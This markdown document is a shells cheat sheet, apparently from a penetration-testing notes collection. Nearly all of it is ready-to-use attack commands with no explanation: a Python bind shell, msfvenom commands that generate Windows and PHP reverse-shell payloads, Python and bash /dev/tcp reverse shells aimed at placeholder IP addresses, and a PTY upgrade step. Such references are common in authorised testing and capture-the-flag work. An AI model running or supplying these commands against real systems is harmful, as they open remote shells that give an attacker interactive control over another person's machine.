<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/shells.md#table-of-contents">Top of Page</a> |
  <a href="/CheatSheets/shells.md#upgrade-to-a-pty-shell">Bottom of Page</a>
</p>

# Cheatsheets - Shells
## Table of Contents
* [Bind Shells](#bind-shells)
  * [Python](#python-bind-shell)
* [Reverse Shells](#reverse-shells)
  * [Msfvenom](#msfvenom-reverse-shells)
  * [Python](#python-reverse-shells) 
  * [BASH](#bash-reverse-shells) 
* [Upgrade to a PTY Shell](#upgrade-to-a-pty-shell)
  * [Python PTY Shell](#python-pty-shell) 

## Bind Shells
#### Python Bind Shell
```python
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## Reverse Shells
#### Msfvenom Reverse Shells
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o shell.asp
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

#### Python Reverse Shells
```python
export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

#### Bash Reverse Shells
```bash
bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

## Upgrade to a PTY Shell
#### Python PTY Shell
```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
```
